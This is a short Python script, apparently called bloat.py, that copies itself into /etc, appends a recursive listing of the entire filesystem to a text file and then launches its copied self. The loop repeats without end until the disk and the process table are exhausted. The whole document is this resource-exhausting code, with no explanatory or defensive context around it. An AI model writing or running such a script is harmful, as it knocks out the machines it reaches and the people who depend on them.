import os
from time import sleep

cp = 'cp bloat.py /etc'
os.system(cp)
find = 'find / >> bloatingproc.txt'
os.system(find)
sleep(5)
py = 'python3 /etc/bloat.py'
os.system(py)
